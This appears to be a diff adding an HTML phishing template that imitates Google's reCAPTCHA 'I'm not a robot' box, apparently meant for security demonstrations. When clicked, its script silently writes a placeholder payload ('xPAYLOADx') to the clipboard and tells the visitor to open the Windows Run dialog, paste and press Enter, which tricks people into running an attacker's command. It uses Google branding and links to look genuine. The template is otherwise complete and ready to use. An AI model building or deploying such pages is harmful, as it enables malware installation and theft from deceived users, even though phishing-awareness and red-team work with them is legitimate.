@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<!-- Based on https://github.com/JohnHammond/recaptcha-phish/blob/main/index.html, improved by six-two -->
+
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>Bot protection</title>
+
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
+        <style>
+        
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center; /* horizontal */
+            align-items: center;     /* vertical */
+        }
+        
+        .captcha-root {
+            max-width: 300px;
+            height: 200px;
+        }
+
+        .captcha-root h3 {
+            text-align: center;
+        }
+        
+        .container {
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }
+
+        .m-p {
+            margin: 0;
+            padding: 0;
+        }
+
+        .block {
+            display: block;
+        }
+
+        #verification-id {
+            color: #1A73E8;
+            font-weight: bold;
+        }
+
+        .line-normal {
+            line-height: normal;
+        }
+
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+        }
+
+        .checkbox-window a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        .checkbox-window a:hover {
+            color: #555;
+            text-decoration: underline;
+        }
+
+        .checkbox-container {
+            width: 28px;
+            height: 28px;
+        }
+
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
+            outline: none;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 3px;
+            font-size: 15px;
+            color: #282727;
+        }
+
+        .captcha-logo {
+            position: relative;
+
+            left: 244px;
+            bottom: 36px;
+            width: 40px;
+            height: 45px;
+            vertical-align: baseline;
+            padding-bottom: 4px;
+        }
+
+
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 8px;
+            text-align: center;
+            bottom: 40px;
+            left: 112px;
+        }
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verify-window {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 310px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+        }
+
+        ol {
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;    
+            padding-left: 0;
+
+        }
+
+        ol li {
+            counter-increment: item;
+            margin-bottom: 10px;
+
+        }
+
+        ol li::before {
+            content: counter(item) ". ";
+            color: #1A73E8;
+            font-weight: bold;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+
+        .verify-container {
+            padding: 8px;
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 16px 16px 24px 16px;
+            color: #fff;
+        }
+
+        .verify-header-text-small {
+            font-size: 14px;
+            line-height: normal;
+        }
+
+        .verify-header-text-medium {
+            font-size: 16px;
+        }
+
+        .verify-header-text-big {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .verify-main {
+            padding: 5px;
+            color: #111;
+            font-size: 13px;
+
+        }
+
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 10px 7px 10px 7px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }
+
+        .verify-footer-left {
+            padding: 5px;
+        }
+
+        .verify-verify-button {
+            text-transform: uppercase;
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            height: min-content;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            cursor: not-allowed;
+        }
+        </style>
+    </head>
+    <body>
+
+    <div class="captcha-root container m-p">
+        <h3>Bot protection</h3>
+        <p>To protect this website from automated attackers and AI bots, we need you to verify you are a human. Please click the box below and complete all the steps.</p>
+        <div id="checkbox-window" class="checkbox-window m-p block">
+            <div class="checkbox-container m-p">
+                <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+            </div>
+            <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+
+            <!-- Source: https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg -->
+            <img src="data:image/svg+xml,%3Csvg%20class%3D%22captcha-logo%20line-normal%22%20alt%3D%22%22%20width%3D%22150%22%20height%3D%22150%22%20version%3D%221.1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3Cpath%20d%3D%22m117%2062.063c-2e-3%20-0.60232-0.0159-1.2014-0.0429-1.7976v-33.991l-9.3971%209.3971c-7.691-9.4141-19.391-15.427-32.496-15.427-13.638%200-25.754%206.5097-33.413%2016.591l15.403%2015.565c1.5095-2.7917%203.6539-5.1895%206.2395-7.0005%202.6891-2.0985%206.4993-3.8143%2011.77-3.8143%200.63674%200%201.1282%200.0744%201.4893%200.21458%206.5304%200.51543%2012.191%204.1194%2015.524%209.3503l-10.903%2010.903c13.81-0.0542%2029.411-0.086%2035.825%207e-3%22%20style%3D%22fill%3A%231c3aa9%22/%3E%3Cpath%20d%3D%22m74.819%2020.246c-0.60232%202e-3%20-1.2014%200.0159-1.7976%200.0429h-33.991l9.3971%209.3971c-9.4141%207.691-15.427%2019.391-15.427%2032.496%200%2013.638%206.5098%2025.754%2016.591%2033.413l15.565-15.403c-2.7917-1.5095-5.1895-3.6539-7.0005-6.2395-2.0984-2.6891-3.8143-6.4993-3.8143-11.77%200-0.63674%200.0744-1.1282%200.21458-1.4893%200.51543-6.5304%204.1194-12.191%209.3503-15.524l10.903%2010.903c-0.0542-13.81-0.0861-29.411%207e-3%20-35.825%22%20style%3D%22fill%3A%234285f4%22/%3E%3Cpath%20d%3D%22m33.002%2062.181c2e-3%200.60232%200.0159%201.2014%200.0429%201.7976v33.991l9.3971-9.3971c7.691%209.4141%2019.391%2015.427%2032.496%2015.427%2013.638%200%2025.754-6.5097%2033.413-16.591l-15.403-15.565c-1.5095%202.7917-3.6539%205.1895-6.2395%207.0005-2.6891%202.0985-6.4993%203.8143-11.77%203.8143-0.63674%200-1.1282-0.0744-1.4893-0.21458-6.5304-0.51543-12.191-4.1194-15.524-9.3503l10.903-10.903c-13.81%200.0542-29.411%200.086-35.825-7e-3%22%20style%3D%22fill%3A%23ababab%22/%3E%3Cpath%20d%3D%22m40.078%20120.24c-1.0215%200-1.9373%200.19374-2.7475%200.58118-0.81015%200.37866-1.497%200.92024-2.0606%201.6247-0.55478%200.70447-0.98186%201.5587-1.2813%202.5625-0.2906%200.99506-0.4359%202.109-0.4359%203.3418v3.5532c0%201.2416%200.1453%202.36%200.4359%203.3551%200.2994%200.99507%200.72209%201.8448%201.2681%202.5493s1.2064%201.246%201.9813%201.6247%201.6467%200.56799%202.6154%200.56799c0.99507%200%201.8669-0.1453%202.6154-0.4359%200.75731-0.29059%201.3913-0.70888%201.9021-1.2548%200.51074-0.55478%200.90261-1.224%201.1756-2.0078%200.28179-0.78373%200.44911-1.6731%200.50194-2.6682h-2.4437c-0.06165%200.76612-0.16731%201.4222-0.31702%201.9681-0.1497%200.53717-0.36985%200.98187-0.66045%201.3341-0.28179%200.34344-0.65164%200.59881-1.1096%200.76613-0.4491%200.1585-1.0039%200.23775-1.6643%200.23775-0.70448%200-1.3033-0.1541-1.7964-0.46231-0.49313-0.31701-0.8938-0.74851-1.202-1.2945-0.2994-0.54598-0.51955-1.1844-0.66045-1.9153-0.13209-0.73091-0.19813-1.519-0.19813-2.3644v-3.5796c0-0.90699%200.07925-1.7304%200.23776-2.4701%200.16731-0.73969%200.41828-1.3693%200.75291-1.8889%200.33463-0.51956%200.75731-0.92023%201.2681-1.202%200.51074-0.29059%201.1184-0.43589%201.8228-0.43589%200.59%200%201.0963%200.088%201.519%200.26419%200.42269%200.16731%200.77492%200.43149%201.0567%200.79252%200.28179%200.35224%200.49754%200.80134%200.64724%201.3473%200.1497%200.54598%200.25097%201.1976%200.3038%201.9549h2.4437c-0.04402-1.0391-0.20694-1.9593-0.48873-2.7607-0.28179-0.80135-0.67366-1.475-1.1756-2.021-0.50194-0.54596-1.114-0.95985-1.836-1.2416-0.71328-0.2818-1.5366-0.42269-2.4701-0.42269zm59.652%200c-1.0215%200-1.9373%200.19374-2.7475%200.58118-0.81015%200.37866-1.497%200.92024-2.0606%201.6247-0.55477%200.70447-0.98187%201.5587-1.2813%202.5625-0.29059%200.99506-0.43588%202.109-0.43588%203.3418v3.5532c0%201.2416%200.14529%202.36%200.43588%203.3551%200.2994%200.99507%200.7221%201.8448%201.2681%202.5493%200.54598%200.70448%201.2064%201.246%201.9813%201.6247%200.77492%200.37866%201.6467%200.56799%202.6154%200.56799%200.99506%200%201.8668-0.1453%202.6154-0.4359%200.7573-0.29059%201.3913-0.70888%201.9021-1.2548%200.51075-0.55478%200.90261-1.224%201.1756-2.0078%200.2818-0.78373%200.44912-1.6731%200.50194-2.6682h-2.4436c-0.0616%200.76612-0.16731%201.4222-0.31702%201.9681-0.1497%200.53717-0.36985%200.98187-0.66044%201.3341-0.28179%200.34344-0.65164%200.59881-1.1096%200.76613-0.4491%200.1585-1.0039%200.23775-1.6643%200.23775-0.70448%200-1.3033-0.1541-1.7964-0.46231-0.49313-0.31701-0.89381-0.74851-1.202-1.2945-0.2994-0.54598-0.51955-1.1844-0.66045-1.9153-0.13208-0.73091-0.19813-1.519-0.19813-2.3644v-3.5796c0-0.90699%200.0793-1.7304%200.23776-2.4701%200.16732-0.73969%200.41828-1.3693%200.75292-1.8889%200.33462-0.51956%200.75731-0.92023%201.268-1.202%200.51075-0.29059%201.1184-0.43589%201.8228-0.43589%200.58999%200%201.0963%200.088%201.519%200.26419%200.42269%200.16731%200.77493%200.43149%201.0567%200.79252%200.28178%200.35224%200.49753%200.80134%200.64723%201.3473%200.1497%200.54598%200.25097%201.1976%200.30381%201.9549h2.4436c-0.0441-1.0391-0.20693-1.9593-0.48873-2.7607-0.28179-0.80135-0.67365-1.475-1.1756-2.021s-1.114-0.95985-1.836-1.2416c-0.71327-0.2818-1.5366-0.42269-2.4701-0.42269zm-45.729%200.26418-6.195%2019.232h2.4833l1.4926-5.0194h6.4988l1.519%205.0194h2.4833l-6.2082-19.232zm10.897%200v19.232h2.4172v-7.5291h3.7117c0.92463%200%201.7436-0.12769%202.4569-0.38306%200.71328-0.26418%201.3121-0.64283%201.7964-1.136%200.49313-0.49314%200.86298-1.1007%201.1095-1.8228%200.25537-0.7309%200.38306-1.5586%200.38306-2.4833%200-0.85418-0.12768-1.6379-0.38306-2.3512-0.24657-0.7221-0.61202-1.3429-1.0963-1.8625-0.48433-0.52835-1.0875-0.93783-1.8096-1.2284-0.71328-0.29059-1.5322-0.43589-2.4569-0.43589zm13.724%200v2.087h5.0458v17.145h2.4172v-17.145h5.059v-2.087zm30.341%200v19.232h2.4172v-8.8896h7.7404v8.8896h2.4304v-19.232h-2.4304v8.2688h-7.7404v-8.2688zm21.755%200-6.195%2019.232h2.4833l1.4926-5.0194h6.4988l1.519%205.0194h2.4833l-6.2082-19.232zm-63.403%202.087h3.7117c0.59%200%201.0919%200.1056%201.5058%200.31701%200.42268%200.21133%200.76612%200.49312%201.0303%200.84536%200.27298%200.35224%200.47112%200.76171%200.5944%201.2284%200.13209%200.4579%200.19814%200.93343%200.19814%201.4266%200%200.54597-0.06604%201.0479-0.19814%201.5058-0.12328%200.44911-0.32142%200.84098-0.5944%201.1756-0.26418%200.32582-0.60761%200.58119-1.0303%200.76612-0.41388%200.18492-0.91582%200.27738-1.5058%200.27738h-3.7117zm-12.284%201.2945%202.6286%208.7443h-5.2439zm76.717%200%202.6286%208.7443h-5.2439zm-113.78%201.2945c-0.60761%200-1.1316%200.1541-1.5719%200.46231-0.43149%200.30821-0.79254%200.72649-1.0831%201.2548l-0.03963-1.453h-2.2719v14.292h2.338v-10.224c0.22015-0.60762%200.53276-1.0875%200.93783-1.4398%200.41388-0.35223%200.93784-0.52835%201.5719-0.52835%200.20254%200%200.38306%209e-3%200.54156%200.0264%200.15851%209e-3%200.33022%200.0308%200.51515%200.066l-0.01321-2.2719c-0.03523-0.0177-0.09246-0.0353-0.17172-0.0529-0.07044-0.0265-0.1497-0.0485-0.23776-0.066-0.08807-0.0176-0.18052-0.0309-0.27739-0.0397-0.08807-0.0176-0.16731-0.0264-0.23776-0.0264zm7.8593%200c-0.67806%200-1.3341%200.11887-1.9681%200.35664-0.63403%200.23776-1.1976%200.62962-1.6907%201.1756-0.48432%200.53716-0.87619%201.2416-1.1756%202.1134-0.2994%200.86298-0.4491%201.9241-0.4491%203.1834v1.6115c0%201.0919%200.12769%202.0386%200.38306%202.8399s0.62082%201.4662%201.0963%201.9946c0.48433%200.51954%201.0699%200.907%201.7568%201.1624%200.68686%200.25538%201.4574%200.38306%202.3116%200.38306%200.61642%200%201.1668-0.0617%201.6511-0.18492%200.49313-0.12329%200.92903-0.2818%201.3077-0.47553%200.37866-0.20255%200.70448-0.43149%200.97746-0.68686s0.50634-0.51955%200.70007-0.79254l-1.2152-1.4794c-0.19373%200.23775-0.40067%200.45791-0.62082%200.66045-0.22015%200.19372-0.46231%200.36545-0.72649%200.51514-0.26418%200.1409-0.55478%200.25098-0.87179%200.33023-0.31701%200.0792-0.67366%200.11888-1.0699%200.11888-1.0831%200-1.9153-0.34784-2.4965-1.0435-0.57239-0.69567-0.85858-1.8096-0.85858-3.3419v-0.33023h7.9782v-1.3605c0-1.0919-0.09246-2.0562-0.27739-2.8928-0.18492-0.83657-0.47992-1.541-0.885-2.1134-0.40507-0.57239-0.92463-1.0039-1.5587-1.2945-0.63403-0.29941-1.4001-0.4491-2.2984-0.4491zm0%202.0078c0.51074%200%200.93343%200.0924%201.2681%200.27739%200.33462%200.18492%200.5988%200.44469%200.79254%200.77931%200.20254%200.33463%200.34783%200.73532%200.43589%201.202%200.09686%200.4579%200.1585%200.96424%200.18492%201.519v0.31701h-5.627c0.03523-0.80135%200.13209-1.4662%200.2906-1.9946s0.36545-0.94665%200.62082-1.2548c0.26418-0.31701%200.56798-0.53715%200.91142-0.66044%200.34343-0.12328%200.71768-0.18492%201.1228-0.18492z%22%20style%3D%22fill%3A%23a6a6a6%22/%3E%3C/svg%3E" class="captcha-logo line-normal" alt="">
+            <br>
+            <p class="checkbox-desc m-p line-normal">
+            <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+            </p>
+            <img class="spinner" alt="" id="spinner">
+        </div>
+        
+        <div id="verify-window" class="verify-window">
+            <div class="verify-container">
+                <header class="verify-header">
+                    <span class="verify-header-text-medium m-p block">Complete these</span>
+                    <span class="verify-header-text-big m-p block">Verification Steps</span>
+                    <span class="verify-header-text-medium m-p block"></span>
+                </header>
+                <main class="verify-main">
+                    <p>
+                        To better prove you are not a robot, please:
+                    </p>
+                    <ol>
+                        <li>
+                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                        </li>
+                        
+                        <li>
+                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                        </li>
+
+                        <li>
+                            Press <b>Enter</b> on your keyboard to finish.
+                        </li>
+                    </ol>
+                    <p>
+                    Your verification code is: <span id="verification-id">xCODEx</span>
+                    </p>
+
+                   
+                </main>
+            </div>
+            <footer class="verify-container verify-footer">
+                <div class="verify-footer-left">
+                    Perform the steps above to finish verification.
+                </div>
+                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+            </footer>
+        </div>        
+    </div>
+
+    <script>
+        let checkboxWindow = document.getElementById("checkbox-window");
+        let checkboxBtn = document.getElementById("checkbox");
+        let checkboxBtnSpinner = document.getElementById("spinner");
+        let verifywindow = document.getElementById("verify-window");
+
+        function addCaptchaListeners() {
+            if (checkboxBtn) {
+                document.addEventListener("click", function (event) {
+                    let path = event.composedPath();
+                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
+                        closeverifywindow();
+                    }
+                });
+                checkboxBtn.addEventListener("click", function (event) {
+                    event.preventDefault();
+                    checkboxBtn.disabled = true;
+                    runClickedCheckboxEffects();
+                });
+            }
+        }
+
+        function runClickedCheckboxEffects() {
+            hideCaptchaCheckbox();
+            setTimeout(function(){
+                showCaptchaLoading();
+            },500);
+            setTimeout(function(){
+                showVerifyWindow();
+            },900)
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.opacity = "0";
+            checkboxBtnSpinner.style.animation = "none";
+            setTimeout(function() {
+                checkboxBtnSpinner.style.visibility = "hidden";
+            }, 500);
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.visibility = "hidden";
+            checkboxBtn.style.opacity = "0";
+        }
+
+
+        function showCaptchaCheckbox() {
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "21px 0 0 12px";
+            checkboxBtn.style.opacity = "1";
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.width = "4px";
+            checkboxBtn.style.height = "4px";
+            checkboxBtn.style.borderRadius = "50%";
+            checkboxBtn.style.marginLeft = "25px";
+            checkboxBtn.style.marginTop = "33px";
+            checkboxBtn.style.opacity = "0";
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "hidden";
+            checkboxBtnSpinner.style.opacity = "0";
+        }
+
+       function generateRandomNumber() {
+            const min = 1000; 
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function closeverifywindow() {
+            verifywindow.style.display = "none";
+            verifywindow.style.visibility = "hidden";
+            verifywindow.style.opacity = "0";
+
+            showCaptchaCheckbox();
+            hideCaptchaLoading();
+            checkboxBtn.disabled = false;
+        }
+
+        function isverifywindowVisible() {
+            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+        }
+
+        function setClipboardCopyData(textToCopy){
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function showVerifyWindow() {
+            verifywindow.style.display = "block";
+            verifywindow.style.visibility = "visible";
+            verifywindow.style.opacity = "1";
+            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
+
+            if (verifywindow.offsetTop < 5) {
+               verifywindow.style.top = "5px";
+            }
+
+            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
+               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
+            }
+
+            var verification_id = generateRandomNumber();
+            document.getElementById('verification-id').textContent = verification_id;
+            
+            setClipboardCopyData("xPAYLOADx".replace("xCODEx", verification_id))
+        }
+
+        addCaptchaListeners();
+
+        </script>
+    </body>
+</html>
